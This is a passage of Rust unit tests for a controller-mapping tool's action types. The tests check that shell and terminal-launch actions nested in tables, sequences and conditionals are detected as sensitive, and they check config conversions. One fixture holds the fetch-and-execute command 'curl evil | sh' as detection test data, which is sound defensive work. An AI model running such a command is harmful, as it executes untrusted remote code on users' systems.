        // by physical state — a Shell branch must make the whole table
        // sensitive (it was a gate bypass before exhaustive recursion).
        use std::collections::HashMap;
        let shell = Box::new(Action::Shell {
            sandbox: None,
            command: "id".to_string(),
            args: None,
            timeout_ms: None,
        });
        let table = Action::ContextSwitchTable {
            kind: ContextKind::Pc,
            channel: 0,
            device: "osc-in".to_string(),
            branches: ContextBranchTable::Pc(HashMap::from([(0u8, shell)])),
            default: None,
            source: LoweringSource {
                origin: "test".to_string(),
                branch_index: None,
            },
        };
        assert!(table.contains_sensitive_action());

        // Via the `default` arm too.
        let table_default = Action::ContextSwitchTable {
            kind: ContextKind::Pc,
            channel: 0,
            device: "osc-in".to_string(),
            branches: ContextBranchTable::Pc(HashMap::new()),
            default: Some(Box::new(Action::Launch("Terminal".to_string()))),
            source: LoweringSource {
                origin: "test".to_string(),
                branch_index: None,
            },
        };
        assert!(table_default.contains_sensitive_action());

        // A table whose branches are all benign is not sensitive.
        let benign = Action::ContextSwitchTable {
            kind: ContextKind::Pc,
            channel: 0,
            device: "osc-in".to_string(),
            branches: ContextBranchTable::Pc(HashMap::from([(
                0u8,
                Box::new(Action::ModeChange {
                    mode: "DJ".to_string(),
                }),
            )])),
            default: None,
            source: LoweringSource {
                origin: "test".to_string(),
                branch_index: None,
            },
        };
        assert!(!benign.contains_sensitive_action());
    }

    #[test]
    fn sensitive_nested_in_wrappers_is_detected() {
        // Sequence containing a Shell → sensitive (refuse the whole sequence).
        let seq = Action::Sequence(vec![
            Action::Text("noise".to_string()),
            Action::Shell {
                sandbox: None,
                command: "curl evil | sh".to_string(),
                args: None,
                timeout_ms: None,
            },
        ]);
        assert!(seq.contains_sensitive_action());

        // Conditional with a sensitive else-branch.
        let cond = Action::Conditional {
            condition: Condition::Always,
            then_action: Box::new(Action::Text("ok".to_string())),
            else_action: Some(Box::new(Action::Launch("Terminal".to_string()))),
        };
        assert!(cond.contains_sensitive_action());

        // Repeat of a benign action → not sensitive.
        let rep = Action::Repeat {
            action: Box::new(Action::Delay(1)),
            count: 3,
            delay_ms: None,
        };
        assert!(!rep.contains_sensitive_action());
    }

    // NOTE: Action execution tests have been moved to conductor-daemon/action_executor.rs
    // These tests now only cover parsing and conversion from ActionConfig to Action

    #[test]
    fn test_action_config_repeat_conversion() {
        use crate::config::ActionConfig;

        let config = ActionConfig::Repeat {
            action: Box::new(ActionConfig::Text {
                text: "test".to_string(),
            }),
            count: 5,
            delay_ms: Some(100),
        };

        let action: Action = config.into();

        match action {
            Action::Repeat {
                count, delay_ms, ..
            } => {
                assert_eq!(count, 5);
                assert_eq!(delay_ms, Some(100));
            }
            _ => panic!("Expected Repeat action"),
        }
    }

    #[test]
    fn test_action_config_conditional_conversion() {
        use crate::config::ActionConfig;

        let config = ActionConfig::Conditional {
            condition: Condition::Always,
            then_action: Box::new(ActionConfig::Text {
                text: "then".to_string(),
            }),
            else_action: Some(Box::new(ActionConfig::Text {
                text: "else".to_string(),
            })),
        };

        let action: Action = config.into();

        match action {
            Action::Conditional { condition, .. } => {
                assert_eq!(condition, Condition::Always);
            }
            _ => panic!("Expected Conditional action"),
        }
    }

    #[test]
    fn test_parse_volume_operation() {
        assert_eq!(parse_volume_operation("Up"), VolumeOperation::Up);
        assert_eq!(parse_volume_operation("up"), VolumeOperation::Up);
        assert_eq!(parse_volume_operation("Down"), VolumeOperation::Down);
        assert_eq!(parse_volume_operation("Mute"), VolumeOperation::Mute);
        assert_eq!(parse_volume_operation("Unmute"), VolumeOperation::Unmute);
        assert_eq!(parse_volume_operation("Set"), VolumeOperation::Set);
        // Unknown operations default to Up
        assert_eq!(parse_volume_operation("invalid"), VolumeOperation::Up);
    }

    #[test]
    fn test_volume_control_action_conversion() {
        use crate::config::ActionConfig;

        let config = ActionConfig::VolumeControl {
            operation: "Up".to_string(),
            value: None,
        };
        let action: Action = config.into();

        match action {
            Action::VolumeControl { operation, value } => {
                assert_eq!(operation, VolumeOperation::Up);
                assert_eq!(value, None);
            }
            _ => panic!("Expected VolumeControl action"),
        }
    }

    #[test]
    fn test_mode_change_action_conversion() {
        use crate::config::ActionConfig;

        let config = ActionConfig::ModeChange {
            mode: "Development".to_string(),
        };
        let action: Action = config.into();

        match action {
            Action::ModeChange { mode } => {
                assert_eq!(mode, "Development");
            }
            _ => panic!("Expected ModeChange action"),
        }
    }

    #[test]
    fn test_plugin_action_conversion() {
        use crate::config::ActionConfig;

        let config = ActionConfig::Plugin {
            plugin: "spotify-control".to_string(),
            params: serde_json::json!({"command": "play_pause"}),
        };
        let action: Action = config.into();

        match action {
            Action::Plugin { plugin, params } => {
                assert_eq!(plugin, "spotify-control");
                assert_eq!(params["command"], "play_pause");
            }
            _ => panic!("Expected Plugin action"),
        }
    }
}
